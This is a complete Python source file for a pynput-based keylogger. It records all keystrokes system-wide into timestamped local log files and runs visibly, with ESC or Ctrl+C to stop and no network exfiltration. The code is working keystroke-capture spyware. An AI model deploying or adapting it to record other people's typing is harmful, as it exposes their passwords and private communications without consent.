"""
keylogger.py
------------
A lightweight Python keylogger built with pynput.

Features:
  - Captures all keystrokes (printable chars + special keys)
  - Writes to a timestamped log file in the /logs directory
  - Marks session start / end clearly
  - Buffers writes and flushes every FLUSH_INTERVAL seconds
  - Stops cleanly on ESC key (configurable) or via keyboard interrupt

Usage:
  python keylogger.py            # run normally
  python keylogger.py --no-esc  # disable ESC-to-stop (logs ESC key instead)
"""

import os
import sys
import time
import threading
import argparse
from datetime import datetime
from pynput import keyboard

# ── Configuration ────────────────────────────────────────────────────────────

LOG_DIR        = os.path.join(os.path.dirname(__file__), "logs")
FLUSH_INTERVAL = 5          # seconds between auto-flushes to disk
STOP_ON_ESC    = True       # can be overridden via --no-esc CLI flag

# ── Special-key display map ───────────────────────────────────────────────────

SPECIAL_KEY_MAP = {
    keyboard.Key.space:         " ",
    keyboard.Key.enter:         "\n[ENTER]\n",
    keyboard.Key.tab:           "[TAB]",
    keyboard.Key.backspace:     "[BACKSPACE]",
    keyboard.Key.delete:        "[DELETE]",
    keyboard.Key.esc:           "[ESC]",
    keyboard.Key.caps_lock:     "[CAPS LOCK]",
    keyboard.Key.shift:         "[SHIFT]",
    keyboard.Key.shift_r:       "[SHIFT]",
    keyboard.Key.ctrl_l:        "[CTRL]",
    keyboard.Key.ctrl_r:        "[CTRL]",
    keyboard.Key.alt_l:         "[ALT]",
    keyboard.Key.alt_r:         "[ALT]",
    keyboard.Key.cmd:           "[WIN]",
    keyboard.Key.up:            "[↑]",
    keyboard.Key.down:          "[↓]",
    keyboard.Key.left:          "[←]",
    keyboard.Key.right:         "[→]",
    keyboard.Key.home:          "[HOME]",
    keyboard.Key.end:           "[END]",
    keyboard.Key.page_up:       "[PGUP]",
    keyboard.Key.page_down:     "[PGDN]",
    keyboard.Key.insert:        "[INSERT]",
    keyboard.Key.print_screen:  "[PRTSC]",
    keyboard.Key.pause:         "[PAUSE]",
    keyboard.Key.num_lock:      "[NUMLOCK]",
    keyboard.Key.scroll_lock:   "[SCROLLOCK]",
    keyboard.Key.f1:  "[F1]",  keyboard.Key.f2:  "[F2]",
    keyboard.Key.f3:  "[F3]",  keyboard.Key.f4:  "[F4]",
    keyboard.Key.f5:  "[F5]",  keyboard.Key.f6:  "[F6]",
    keyboard.Key.f7:  "[F7]",  keyboard.Key.f8:  "[F8]",
    keyboard.Key.f9:  "[F9]",  keyboard.Key.f10: "[F10]",
    keyboard.Key.f11: "[F11]", keyboard.Key.f12: "[F12]",
}

# ── Logger class ─────────────────────────────────────────────────────────────

class KeyLogger:
    """Captures keystrokes and persists them to a log file."""

    def __init__(self, stop_on_esc: bool = True):
        self.stop_on_esc = stop_on_esc
        self._buffer: list[str] = []
        self._lock   = threading.Lock()
        self._stop   = threading.Event()
        self._log_path = self._create_log_file()
        self._listener: keyboard.Listener | None = None

    # ── Setup ────────────────────────────────────────────────────────────────

    def _create_log_file(self) -> str:
        """Create /logs directory and return path to today's log file."""
        os.makedirs(LOG_DIR, exist_ok=True)
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        path = os.path.join(LOG_DIR, f"keylog_{timestamp}.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"{'='*60}\n")
            f.write(f"  KeyLogger Session Started\n")
            f.write(f"  {datetime.now().strftime('%A, %B %d %Y  %I:%M:%S %p')}\n")
            f.write(f"{'='*60}\n\n")
        return path

    # ── Keyboard callbacks ───────────────────────────────────────────────────

    def _on_press(self, key) -> bool | None:
        """Called on every key press. Returns False to stop listener."""
        char = self._format_key(key)

        if self.stop_on_esc and key == keyboard.Key.esc:
            self._buffer_write(char)
            self._flush()
            self._stop.set()
            return False          # signal pynput to stop

        self._buffer_write(char)

    def _on_release(self, key) -> None:
        """Not used for logging but required by pynput API."""
        pass

    # ── Helpers ──────────────────────────────────────────────────────────────

    def _format_key(self, key) -> str:
        """Return a human-readable string for a key event."""
        if key in SPECIAL_KEY_MAP:
            return SPECIAL_KEY_MAP[key]
        try:
            return key.char if key.char is not None else f"[{key}]"
        except AttributeError:
            return f"[{key}]"

    def _buffer_write(self, text: str) -> None:
        with self._lock:
            self._buffer.append(text)

    def _flush(self) -> None:
        """Drain buffer to disk."""
        with self._lock:
            if not self._buffer:
                return
            content = "".join(self._buffer)
            self._buffer.clear()

        with open(self._log_path, "a", encoding="utf-8") as f:
            f.write(content)

    def _auto_flush_loop(self) -> None:
        """Background thread: flush buffer to disk every FLUSH_INTERVAL sec."""
        while not self._stop.is_set():
            self._stop.wait(timeout=FLUSH_INTERVAL)
            self._flush()

    # ── Public interface ─────────────────────────────────────────────────────

    def start(self) -> None:
        """Start logging. Blocks until stopped."""
        print(f"\n  ✅  KeyLogger started")
        print(f"  📄  Log file : {self._log_path}")
        if self.stop_on_esc:
            print(f"  🛑  Press  ESC  to stop\n")
        else:
            print(f"  🛑  Press  Ctrl+C  to stop\n")

        flush_thread = threading.Thread(
            target=self._auto_flush_loop, daemon=True
        )
        flush_thread.start()

        with keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release,
        ) as self._listener:
            try:
                self._listener.join()
            except KeyboardInterrupt:
                pass

        self._stop.set()
        self._flush()
        self._write_footer()
        print("\n  🛑  KeyLogger stopped. Log saved.\n")

    def _write_footer(self) -> None:
        with open(self._log_path, "a", encoding="utf-8") as f:
            f.write(f"\n\n{'='*60}\n")
            f.write(f"  Session Ended\n")
            f.write(f"  {datetime.now().strftime('%A, %B %d %Y  %I:%M:%S %p')}\n")
            f.write(f"{'='*60}\n")


# ── Entry point ───────────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Python Keylogger — tracks keystrokes to a local log file."
    )
    parser.add_argument(
        "--no-esc",
        action="store_true",
        help="Disable ESC key as a stop signal (use Ctrl+C instead).",
    )
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    logger = KeyLogger(stop_on_esc=not args.no_esc)
    try:
        logger.start()
    except KeyboardInterrupt:
        print("\n  Interrupted by user.")
